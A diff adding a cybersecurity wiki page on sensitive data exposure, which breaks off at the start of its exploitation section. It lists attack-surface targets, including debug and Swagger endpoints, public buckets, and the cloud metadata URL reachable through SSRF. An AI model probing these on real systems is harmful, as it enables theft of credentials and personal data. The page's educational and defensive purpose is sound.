@@ -1,0 +1,2183 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Sensitive Data Exposure # Sensitive Data Exposure occurs when an application inadvertently reveals confidential information: credentials, PII, financial data, internal tokens, cryptographic keys, or infrastructure details to unauthorized parties. Unlike active exploitation attacks, many sensitive data exposures are passive: the data is simply there, unprotected, waiting to be read. It spans every layer of the stack from HTTP responses and JavaScript bundles to misconfigured cloud buckets and weak database encryption making it one of the broadest and most consistently impactful vulnerability classes in modern applications.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Sensitive Data Exposure" />
+<meta property="og:description" content="Sensitive Data Exposure # Sensitive Data Exposure occurs when an application inadvertently reveals confidential information: credentials, PII, financial data, internal tokens, cryptographic keys, or infrastructure details to unauthorized parties. Unlike active exploitation attacks, many sensitive data exposures are passive: the data is simply there, unprotected, waiting to be read. It spans every layer of the stack from HTTP responses and JavaScript bundles to misconfigured cloud buckets and weak database encryption making it one of the broadest and most consistently impactful vulnerability classes in modern applications." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>Sensitive Data Exposure | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class=" active">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Sensitive Data Exposure</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#sensitive-data-exposure">Sensitive Data Exposure</a>
+      <ul>
+        <li><a href="#understanding-sensitive-data-exposure-basics">Understanding Sensitive Data Exposure Basics</a>
+          <ul>
+            <li><a href="#the-exposure-triangle">The Exposure Triangle</a></li>
+            <li><a href="#common-data-types-targeted">Common Data Types Targeted</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a>
+          <ul>
+            <li><a href="#api--endpoint-leakage">API &amp; Endpoint Leakage</a></li>
+            <li><a href="#cloud-misconfigurations">Cloud Misconfigurations</a></li>
+            <li><a href="#cryptographic-failures">Cryptographic Failures</a></li>
+            <li><a href="#client-side-exposure">Client-Side Exposure</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploiting-sensitive-data-exposure">Exploiting Sensitive Data Exposure</a>
+          <ul>
+            <li><a href="#1-api-over-fetching--mass-object-exposure">1. API Over-Fetching / Mass Object Exposure</a></li>
+            <li><a href="#2-verbose-error-messages--stack-trace--path-disclosure">2. Verbose Error Messages — Stack Trace / Path Disclosure</a></li>
+            <li><a href="#3-cloud-metadata-ssrf--credential-harvesting">3. Cloud Metadata SSRF — Credential Harvesting</a></li>
+            <li><a href="#4-public-cloud-storage-enumeration">4. Public Cloud Storage Enumeration</a></li>
+            <li><a href="#5-javascript-bundle-mining">5. JavaScript Bundle Mining</a></li>
+            <li><a href="#6-cryptographic-failure-weak-hash-cracking">6. Cryptographic Failure: Weak Hash Cracking</a></li>
+            <li><a href="#7-git-repository--backup-file-exposure">7. Git Repository &amp; Backup File Exposure</a></li>
+            <li><a href="#8-http-response-header-leakage">8. HTTP Response Header Leakage</a></li>
+          </ul>
+        </li>
+        <li><a href="#bypasses--obfuscation">Bypasses &amp; Obfuscation</a>
+          <ul>
+            <li><a href="#1-accessing-hidden-api-fields-via-parameter-manipulation">1. Accessing Hidden API Fields via Parameter Manipulation</a></li>
+            <li><a href="#2-older-api-version-regression">2. Older API Version Regression</a></li>
+            <li><a href="#3-forced-error-state-triggering">3. Forced Error State Triggering</a></li>
+            <li><a href="#4-cache--cdn-poisoning-to-surface-private-responses">4. Cache / CDN Poisoning to Surface Private Responses</a></li>
+          </ul>
+        </li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#framework-specific-scenarios">Framework-Specific Scenarios</a>
+          <ul>
+            <li><a href="#spring-boot-java--actuator-exposure">Spring Boot (Java) — Actuator Exposure</a></li>
+            <li><a href="#django-python--debug-mode--secret-key-exposure">Django (Python) — Debug Mode &amp; Secret Key Exposure</a></li>
+            <li><a href="#laravel-php--env-file--debug-bar-exposure">Laravel (PHP) — .env File &amp; Debug Bar Exposure</a></li>
+            <li><a href="#expressjs--nodejs--environment-variable-leakage">Express.js / Node.js — Environment Variable Leakage</a></li>
+            <li><a href="#ruby-on-rails--full-error-pages--credential-leakage">Ruby on Rails — Full Error Pages &amp; Credential Leakage</a></li>
+            <li><a href="#graphql--introspection--over-fetching">GraphQL — Introspection &amp; Over-fetching</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#manual-detection">Manual Detection</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention-techniques">Prevention Techniques</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#hackerone-reports">HackerOne Reports</a></li>
+            <li><a href="#writeups">Writeups</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="sensitive-data-exposure">
+  Sensitive Data Exposure
+  <a class="anchor" href="#sensitive-data-exposure">#</a>
+</h1>
+<p>Sensitive Data Exposure occurs when an application inadvertently reveals confidential information: credentials, PII, financial data, internal tokens, cryptographic keys, or infrastructure details to unauthorized parties. Unlike active exploitation attacks, many sensitive data exposures are <strong>passive</strong>: the data is simply there, unprotected, waiting to be read. It spans every layer of the stack from HTTP responses and JavaScript bundles to misconfigured cloud buckets and weak database encryption making it one of the broadest and most consistently impactful vulnerability classes in modern applications.</p>
+<h2 id="understanding-sensitive-data-exposure-basics">
+  Understanding Sensitive Data Exposure Basics
+  <a class="anchor" href="#understanding-sensitive-data-exposure-basics">#</a>
+</h2>
+<h3 id="the-exposure-triangle">
+  The Exposure Triangle
+  <a class="anchor" href="#the-exposure-triangle">#</a>
+</h3>
+<p>Three root conditions produce the overwhelming majority of sensitive data exposures:</p>
+<ol>
+<li><strong>Transmission Exposure:</strong> Data sent over unencrypted or weakly encrypted channels HTTP instead of HTTPS, deprecated TLS, or cleartext internal service communication.</li>
+<li><strong>Storage Exposure:</strong> Data stored without encryption, with weak algorithms (MD5, SHA-1 unsalted), or in locations readable by unauthorized parties (public S3 buckets, world-readable files).</li>
+<li><strong>Surfacing Exposure:</strong> Data that is encrypted or protected in its canonical location but leaked through side channels error messages, API responses, JavaScript source, logs, headers, or backup files.</li>
+</ol>
+<h3 id="common-data-types-targeted">
+  Common Data Types Targeted
+  <a class="anchor" href="#common-data-types-targeted">#</a>
+</h3>
+<ul>
+<li><strong>Authentication material:</strong> Passwords (plaintext or weakly hashed), API keys, JWT secrets, OAuth tokens, session IDs.</li>
+<li><strong>PII:</strong> Full names, email addresses, dates of birth, national ID numbers, passport scans.</li>
+<li><strong>Financial data:</strong> Credit card numbers (PANs), CVVs, bank account numbers, transaction histories.</li>
+<li><strong>Infrastructure secrets:</strong> Database connection strings, cloud provider credentials (<code>AWS_ACCESS_KEY_ID</code>), internal IP ranges, private TLS certificates.</li>
+<li><strong>Business-sensitive data:</strong> Unreleased product data, internal pricing, employee records, M&amp;A documents.</li>
+</ul>
+<h2 id="attack-surface">
+  Attack Surface
+  <a class="anchor" href="#attack-surface">#</a>
+</h2>
+<h3 id="api--endpoint-leakage">
+  API &amp; Endpoint Leakage
+  <a class="anchor" href="#api--endpoint-leakage">#</a>
+</h3>
+<ul>
+<li>REST/GraphQL endpoints returning full object models with unexposed fields (mass assignment inverse over-fetching)</li>
+<li>Error responses embedding stack traces, SQL queries, or internal paths</li>
+<li>Debug endpoints left active in production (<code>/actuator</code>, <code>/debug</code>, <code>/_ah/admin</code>, <code>/trace</code>)</li>
+<li>API versioning drift old <code>/v1/</code> endpoints returning richer data than newer hardened <code>/v2/</code> equivalents</li>
+<li>Swagger/OpenAPI docs (<code>/swagger.json</code>, <code>/api-docs</code>, <code>/openapi.yaml</code>) publicly accessible and revealing internal endpoint structure</li>
+</ul>
+<h3 id="cloud-misconfigurations">
+  Cloud Misconfigurations
+  <a class="anchor" href="#cloud-misconfigurations">#</a>
+</h3>
+<ul>
+<li>Public S3 / GCS / Azure Blob Storage buckets exposing backups, logs, or user uploads</li>
+<li>Overly permissive IAM policies attaching <code>s3:GetObject *</code> to unauthenticated principals</li>
+<li>Publicly accessible cloud metadata endpoints from SSRF (<code>http://169.254.169.254/latest/meta-data/</code>)</li>
+<li>Misconfigured Elasticsearch / Kibana / Grafana instances with no authentication exposed to the internet</li>
+<li>Cloud function environment variables (<code>process.env</code>) leaking secrets in error responses or verbose logging</li>
+</ul>
+<h3 id="cryptographic-failures">
+  Cryptographic Failures
+  <a class="anchor" href="#cryptographic-failures">#</a>
+</h3>
+<ul>
+<li>Passwords stored as unsalted MD5 or SHA-1 hashes trivially cracked with rainbow tables</li>
+<li>Sensitive fields (SSN, card numbers) stored in plaintext in the database</li>
+<li>Symmetric encryption with hardcoded or reused IVs (ECB mode, static nonce in AES-GCM)</li>
+<li>Tokens and session IDs generated with weak PRNGs (<code>rand()</code>, <code>Math.random()</code>)</li>
+<li>Private keys stored in version control, world-readable config files, or backup archives</li>
+</ul>
+<h3 id="client-side-exposure">
+  Client-Side Exposure
+  <a class="anchor" href="#client-side-exposure">#</a>
+</h3>
+<ul>
+<li>API keys, tokens, or credentials hardcoded in JavaScript bundles shipped to the browser</li>
+<li>Sensitive data persisted to <code>localStorage</code> or <code>sessionStorage</code> without encryption</li>
+<li>HTML comments containing developer notes, internal URLs, or credential placeholders</li>
+<li>Source maps (<code>.map</code> files) deployed to production exposes original source code of minified bundles</li>
+<li>Browser <code>autocomplete</code> enabled on sensitive form fields (passwords, card numbers, OTPs)</li>
+</ul>
+<h2 id="exploiting-sensitive-data-exposure">
+  Exploiting Sensitive Data Exposure
+  <a class="anchor" href="#exploiting-sensitive-data-exposure">#</a>
+</h2>
